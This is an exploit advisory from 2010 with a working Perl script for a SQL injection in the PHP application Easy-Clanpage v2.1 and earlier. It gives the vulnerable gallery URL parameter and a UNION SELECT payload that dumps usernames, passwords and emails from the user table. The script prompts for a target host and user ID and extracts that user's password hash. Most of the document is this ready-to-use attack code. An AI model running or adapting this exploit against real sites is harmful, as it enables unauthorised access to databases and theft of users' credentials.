/*----------------------------Information------------------------------------------------
+Name : Easy-Clanpage <= v2.1 SQL Injection Exploit
+Author : Easy Laster
+Date   : 30.03.2010
+Script Easy-Clanpage <= v2.1
+Download : Update Version 2.01->2.1 http://www.easy-clanpage.de
/?section=downloads&action=viewdl&id=16
+Price : for free
+Language : PHP
+Discovered by Easy Laster
+Security Group 4004-Security-Project
+Greetz to Team-Internet ,Underground Agents
+And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
Kiba,-tmh-,Dr Chaos,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
N00bor,Ic3Drag0n,novaca!ne,n3w7u,Maverick010101.
*/ 
/*---------------------------------------------------------------------------------------
                                                                                      
 ___ ___ ___ ___                         _ _           _____           _         _  
| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|
                                              |___|                 |___|          
 
 
----------------------------------------------------------------------------------------
+Vulnerability : http://www.site.com/Easy-Clanpage/?section=gallery&action=kate&id=
 

#SQL Injection
+Exploitable   : http://www.site.com/Easy-Clanpage/?section=gallery&action=kate&id=1
+union+select+1,2,concat(username,0x3a,password,0x3a,email),4,5,6,7+from+ecp_user
+where+userid=1--
-----------------------------------------------------------------------------------------

+Exploit
*/

#!usr\bin\perl
#
#
##################################################
# Modules                                        #
#------------------------------------------------#     
use strict;               # Better coding.       #
use warnings;             # Useful warnings.     #
use LWP::Simple;          # procedureal interface#
##################################################
print "
##################################################
#            4004-Security-Project               #
##################################################
#      Easy-Clanpage <= v2.1 SQL Injection       #
#                   Exploit                      #
#            Using Host+Path+Userid              #
#          www.demo.de /easyclanpage/ 1          #
#                   Easy Laster                  #
##################################################
\a\n";
my($host,$path,$userid,$request);
my($first,$block,$error,$dir);
$block = "
##################################################\n";
$error = "Exploit failed";
  print "$block";
    print q(Target www.demo.de->);
    chomp($host =<STDIN>);
    if ($host eq""){
    die "$error\a\n"};
    print "$block";
          print q(Path /path/ ->);
          chomp($path =<STDIN>);
          if ($path eq""){
          die "$error\a\n";}
                 print "$block";
                 print q(userid->);
                  chomp($userid =<STDIN>);
                      if ($userid eq""){
                      die "$error\a\n";}
                      print "$block";
                         $dir = "?section=gallery&action=kate&id=";
                         print "<~> Exploiting...\n";
                         $host = "http://".$host.$path;
                           print "<~> Connecting...\n";
                           $request = get($host.$dir."1+union+select+1,2,concat(0x23,0x23,0x23,0x23,0x23,password),4,5,6,7+from+ecp_user+where+userid=".$userid."--");
                       $first = rindex($request,"#####");
                       if ($first != -1)
                       {
               print "<~> Exploiting...\n";
               print "$block\n";
         $request = substr($request, $first+5, 32);
         print "<~> Hash = $request\n\r\n\a";
       }
       else
     {
   print "<~> $error";
}
